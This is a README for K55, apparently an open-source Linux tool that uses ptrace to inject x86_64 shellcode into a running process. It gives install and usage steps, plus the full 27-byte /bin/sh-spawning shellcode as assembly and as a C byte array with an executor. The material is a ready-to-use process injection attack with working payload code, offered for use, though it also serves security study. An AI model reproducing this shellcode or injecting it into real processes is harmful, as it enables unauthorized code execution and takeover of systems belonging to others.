## K55 - Linux x86_64 Process Injection Utility (C++11)

## About K55 
(pronounced: "kay fifty-five")<br/>
The K55 payload injection tool is used for injecting x86_64 shellcode payloads into running processes. The utility was developed using modern C++11 techniques as well as some traditional C linux functions like ``ptrace()``. The shellcode spawned in the target process is 27 bytes and it executes /bin/sh (spawns a bash shell) within the target's address space.<br/>

## Installation
1. ``git clone https://github.com/josh0xA/K55.git``<br/>
2. ``cd K55``<br/>
3. ``chmod +x build-install.sh``<br/>
4. ``./build-install.sh``<br/>

## K55 Usage
``Usage: ./K55 <process-name>``<br/>
- process-name can be any linux process with ``r-xp`` or ``execstack`` permissions. <br/>

### Tests
Test 1) In one terminal (K55/ Directory), run: ``./k55_example_process/k55_test_process``<br/>
Test 2) In another terminal, run the injector: ``./K55 k55_test_process``<br/>

## K55 In Action
- A shell is spawned in k55_test_process when the K55 shellcode injector is ran (as root). 
### Injecting Into Given Process
<p align="center">
    <img src="https://github.com/josh0xA/K55/blob/main/imgs/injector_proof.png?raw=true">
</p> 

### Shell Spawned In Target
<p align="center">
    <img src="https://github.com/josh0xA/K55/blob/main/imgs/target_proof1.png?raw=true">
</p>

## Crafting The Shell Payload
Note: The following is a demonstration. The payload string is already hardcoded into K55.

#### Assembly Implementation of The Payload ([Cited from shell-storm (redirect)](http://shell-storm.org/shellcode/files/shellcode-806.php))
```asm
main:
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
```
#### C-Implementation of The Payload
```c
#include <stdio.h>
#include <string.h>

// Shellcode breakdown of the assembly code.
char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}

```
## References
http://shell-storm.org/shellcode/files/shellcode-806.php <br/>
https://0x00sec.org/t/linux-infecting-running-processes/1097 <br/>

## License 
MIT License <br/>
Copyright (c) Josh Schiavone
